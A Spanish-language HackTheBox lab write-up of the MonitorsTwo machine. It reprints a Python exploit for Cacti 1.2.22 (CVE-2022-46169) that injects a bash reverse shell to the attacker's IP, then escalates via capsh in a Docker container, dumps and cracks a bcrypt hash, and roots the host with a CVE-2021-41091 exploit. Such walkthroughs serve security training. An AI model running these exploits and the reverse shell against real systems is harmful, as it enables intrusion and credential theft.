---
layout      : post
title       : "MonitorsTwo - HackTheBox"
author      : elc4br4
image       : /assets/images/HTB/MonitorsTwo-HackTheBox/MonitorsTwo.jpg
optimized_image : /assets/images/HTB/MonitorsTwo-HackTheBox/MonitorsTwo.jpg
category    : [ htb ]
tags        : [ Linux ]
description : Máquina easy de la plataforma HackTheBox, en la que explotaremos un RCE, escalaremos privilegios en docker para poder obtener credenciales y acceder a la máquina víctima y acabaremos escalando privilegios explotando una vulnerabilidad de docker.
---

Máquina easy de la plataforma HackTheBox, en la que explotaremos un RCE, escalaremos privilegios en docker para poder obtener credenciales y acceder a la máquina víctima y acabaremos escalando privilegios explotando una vulnerabilidad de docker.

**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
2. [Explotación](#explotación).
3. [Escalada de Privilegios](#privesc). 

# Reconocimiento [#](reconocimiento) {#reconocimiento}

Como siempre comenzamos a con el reconocimiento de puertos abiertos en la máquina víctima, y como de costumbre esto lo hacemos con nmap.

```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

Como podemos ver tenemos los puertos 80 (http) y 22 (ssh) abiertos.

Lanzo un escaneo un poco más avanzado para descubrir algo más de información acerca de los servicios que corren en cada puerto.

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Sabemos que en el puerto 80 corre un servidor web nginx 1.18.0.

Por lo que voy a echarle un ojo desde el navegador para ver que encuentro.

![](/assets/images/HTB/MonitorsTwo-HackTheBox/web1.webp)

Vemos que tenemos un login, pero no dispongo de credenciales... y el servidor web parece ser un Cacti Versión 1.2.22.

Por lo que voy a buscar vulnerabilidades asociadas a la versión 1.2.22, pero antes de nada es importante saber que es Cacti.

## ¿Qué es Cacti?

Cacti es una completa solución para la generación de gráficos en red, diseñada para aprovechar el poder de almacenamiento y la funcionalidad para gráficas que poseen las aplicaciones RRDtool.

En otras palabras, es una solución que permite monitorizar la red y generar gráficos en red.

Ahora que ya sabemos qué es más o menos procedo a buscar vulnerabilidades.

# Explotación [#](explotación) {#explotación}

Buscando encuentro que la versión 1.2.22 es vulnerable a RCE (Remote Command Execution) y encuentro unn exploit en github.

https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22

Me lo descargo en mi máquina atacante y echo un vistazo al código para saber que hace este exploit.

Podríamos dividir el exploit en 4 partes.

> Primera parte 

Este código define una función llamada get_arguments() que utiliza la biblioteca optparse para analizar los argumentos de línea de comandos que se le pasan.

Los argumentos definidos por la función son:

```bash
-u o --url: la URL del objetivo que se va a atacar.
--LHOST: la dirección IP del host desde donde se lanzará el ataque.
--LPORT: el número del puerto de escucha que se usará para la conexión inversa en caso de éxito del ataque.
```

Si alguno de estos argumentos no se proporciona correctamente o directamente no se proporciona, la función nos mostrará un mensaje de error para que lo corrijamos.

```python
def get_arguments():
    parser= optparse.OptionParser()
    parser.add_option('-u', '--url', dest='url_target', help='The url target')
    parser.add_option('', '--LHOST', dest='lhost', help='Your ip')
    parser.add_option('', '--LPORT', dest='lport', help='The listening port')
    (options, arguments) = parser.parse_args()
    if not options.url_target:
        parser.error('[*] Pls indicate the target URL, example: -u http://10.10.10.10')
    if not options.lhost:
        parser.error('[*] Pls indicate your ip, example: --LHOST=10.10.10.10')
    if not options.lport:
        parser.error('[*] Pls indicate the listening port for the reverse shell, example: --LPORT=443')
    return options
```

> Segunda parte

En esta segunda parte se define una función llamada checkVuln() que usa la biblioteca requests para enviar una solicitud GET a una URL determinada.

La función verifica si la respuesta de la solicitud no es "FATAL: You are not authorized to use this service" y si el código de estado HTTP de la respuesta no es 403.
Si cualquiera de estas condiciones es verdadera, la función devuelve True, lo que indica que la URL es vulnerable. De lo contrario, devuelve False, lo que indica que la URL no es vulnerable.

En resumen, la función checkVuln() se utiliza para verificar si una URL determinada es vulnerable a este ataque.

```python
def checkVuln():
    r = requests.get(Vuln_url, headers=headers)
    return (r.text != "FATAL: You are not authorized to use this service" and r.status_code != 403)
```

> Tercera parte 

La función bruteForcing() se utiliza para realizar un ataque de fuerza bruta en la URL que le pasaremos, utilizando dos bucles anidados para iterar a través de todas las combinaciones posibles de valores de n y n2, y verificando la respuesta de cada solicitud para encontrar una combinación exitosa.

```python
def bruteForcing():
    for n in range(1,5):
        for n2 in range(1,10):
            id_vulnUrl = f"{Vuln_url}?action=polldata&poller_id=1&host_id={n}&local_data_ids[]={n2}"
            r = requests.get(id_vulnUrl, headers=headers)
            if r.text != "[]":
                RDname = r.json()[0]["rrd_name"]
                if RDname == "polling_time" or RDname == "uptime":
                    print("Bruteforce Success!!")
                    return True, n, n2
    return False, 1, 1
```

> Cuarta parte

Se define de nuevo una función que se utiliza para explotar la vulnerabilidad RCE en la URL mediante la inyección de una reverse shell en la URL, y utiliza una función de fuerza bruta para encontrar los valores adecuados para `host_id` y `data_ids`.

```python
def Reverse_shell(payload, host_id, data_ids):
    PayloadEncoded = urllib.parse.quote(payload)
    InjectRequest = f"{Vuln_url}?action=polldata&poller_id=;{PayloadEncoded}&host_id={host_id}&local_data_ids[]={data_ids}"
    r = requests.get(InjectRequest, headers=headers)


if __name__ == '__main__':
    options = get_arguments()
    Vuln_url = options.url_target + '/remote_agent.php'
    headers = {"X-Forwarded-For": "127.0.0.1"}
    print('Checking...')
    if checkVuln():
        print("The target is vulnerable. Exploiting...")
        print("Bruteforcing the host_id and local_data_ids")
        is_vuln, host_id, data_ids = bruteForcing()
        myip = options.lhost
        myport = options.lport
        payload = f"bash -c 'bash -i >& /dev/tcp/{myip}/{myport} 0>&1'"
        if is_vuln:
            Reverse_shell(payload, host_id, data_ids)
        else:
            print("The Bruteforce Failled...")

    else:
        print("The target is not vulnerable")
        sys.exit(1)
```

Ahora que ya sabemos más o menos como funciona el exploit, lo lanzamos, pero antes de nada nos abrimos un oyente de netcat en el puerto 443.

```bash
❯ python3 CVE-2022-46169.py -u http://10.10.11.211 --LHOST=10.10.14.23 --LPORT=443
Checking...
The target is vulnerable. Exploiting...
Bruteforcing the host_id and local_data_ids
Bruteforce Success!!
```

```bash
❯ sudo nc -lnvp 443
[sudo] password for elc4br4: 
listening on [any] 443 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.11.211] 41844
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Y por fin ganamos acceso a la máquina, pero parece que estamos ante un contenedor docker...

Por lo que habrá que pasar del docker al hosts.

Lo primero que hago es lanzar linpeas para buscar la forma de escalar privilegios en el propio contenedor.

Tras lanzarlo encuentro un binario que podría servirme como vector de escalada, el binario `capsh`.

![](/assets/images/HTB/MonitorsTwo-HackTheBox/capsh.webp)

Por lo que accedo a gtfobins para averiguar como aprovechar este binario para escalar privilegios.

![](/assets/images/HTB/MonitorsTwo-HackTheBox/capsh-gtfo.webp)

```bash
www-data@50bca5e748b0:/tmp$ /sbin/capsh --gid=0 --uid=0 --
/sbin/capsh --gid=0 --uid=0 --
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
whoami
root
```

Y me convierto en root dentro del contenedor docker.

Y de nuevo vuelvo a lanzar linpeas.sh en busca de credenciales o de algo que me pueda servir para acceder a la máquina víctima real y salir del contenedor.

Tras lanzarlo encuentro un archivo algo curioso llamado `entrypoint.sh`, por lo que le hago un cat para leerlo y tiene el siguiente contenido.

```bash
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
	set -- apache2-foreground "$@"
fi

exec "$@"
```

Este script se ejecuta en el inicio del contenedor Docker y se basa en configurar y poner en marcha el servicio de monitoreo de red Cacti.

Primero, espera hasta que el servicio de base de datos (MySQL) esté disponible. 
Luego, comprueba si la base de datos de Cacti está vacía o no. Si está vacía, importa el archivo de respaldo de la base de datos (cacti.sql) y realiza configuraciones básicas.

Por lo que tenemos tanto el usuario como la contraseña de la base de datos... eso quiere decir que podemos conectarnos en busca de credenciales o algo que me ayude a salir del contenedor.

```bash
mysql --host=db --user=root --password=root cacti -e "show tables"
```
De todas las tablas que existen en la base de datos usaré la tabla `user_auth`

Por lo que lo siguiente es listar el contenido de la tabla.

```bash
mysql --host=db --user=root --password=root cacti -e "select * from user_auth"
id	username	password	realm	full_name	email_address	must_change_password	password_change	show_tree	show_list	show_preview	graph_settings	login_opts	policy_graphs	policy_trees	policy_hosts	policy_graph_templates	enabled	lastchange	lastlogin	password_history	locked	failed_attempts	lastfail	reset_perms
1	admin	$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC	0	Jamie Thompson	admin@monitorstwo.htb		on	on	on	on	on	2	1	on	-1	-1	-1		0	0	663348655
3	guest	43e9a4ab75570f5b	0	Guest Account		on	on	on	on	on	3	1	1	1	1	1		-1	-1	-1	0
4	marcus	$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C	0	Marcus Brune	marcus@monitorstwo.htb			on	on	on	on	1	1	on	-1	-1		on	0	0	2135691668
```

Y ahí encontramos el hash del usuario `marcus`, hash que intentaré craquear a continuación con John The Ripper.

> marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
funkymonkey      
```

> marcus:funkymonkey

Ahora que ya dispongo de credenciales el siguiente paso es intentar conectarme vía ssh a la máquina víctima.

Tras conectarme consigo leer la flag de usuario, por lo que el próximo paso es escalar privilegios a root.

# Escalada de Privilegios [#](privesc) {#privesc}

De nuevo vuelvo a lanzar `linpeas.sh` para buscar la forma para escalar a root.

![](/assets/images/HTB/MonitorsTwo-HackTheBox/mail1.webp)

Encuentro algo en el mail de marcus...

![](/assets/images/HTB/MonitorsTwo-HackTheBox/mail2.webp)

En este mail se nos habla de 3 vulnerabilidades, pero la que más me llama la atención es la CVE-2021-41091, que está relacionada con los contenedores docker.

Por lo que investigo un poco sobre la misma... y encuentro un exploit que podría servirme.

https://github.com/UncleJ4ck/CVE-2021-41091

Descargo el exploit y lo paso a la máquina víctima.

Lo ejecuto pero me arroja un error...

```bash
marcus@monitorstwo:/tmp$ ./exp.sh
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[>] After gaining root access execute this command (chmod u+s /bin/bash)

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
[!] Available Overlay2 Filesystems:
/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

[!] Iterating over the available Overlay2 filesystems !
[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[!] Rooted !
[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'

[!] Spawning Shell
bash-5.1# exit
```

Por lo que veo que primero he de asignar permisos SUID a la bash desde el contenedor docker donde tengo acceso como root.

```bash
chmod u+s /bin/bash
```

De forma que una vez le he asignado permisos SUID vuelvo a lanzar el exploit.

Lo lanzo, me dirijo a la ruta `/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged` y ejecuto `/bin/bash -p`.

```bash
marcus@monitorstwo:/tmp$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p
bash-5.1# id
uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
5f483b6d******c66795d72ac*******
```

Y finalmente me convierto en root y puedo leer la flag root.






